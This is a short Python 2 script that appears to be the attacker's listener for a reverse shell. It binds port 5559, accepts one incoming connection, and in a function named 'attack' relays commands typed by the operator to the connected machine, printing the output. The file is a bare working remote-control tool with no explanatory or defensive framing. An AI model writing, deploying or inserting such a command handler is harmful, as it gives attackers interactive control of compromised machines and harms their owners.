import socket

#[s bla]

def attack(s,conn,addr):
    print "Connected to: ",addr[0],"@ Port: ",addr[1]
    while True:
        cmd = raw_input("")
        if len(cmd) > 0:
            conn.send(cmd)
            c_cmd = conn.recv(1024)
            print c_cmd

host = ''
port = 5559

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((host,port))
    s.listen(1)
    conn, addr = s.accept()

except socket.error as e:
    print e

else:
    attack(s,conn,addr)

finally:
    s.close()
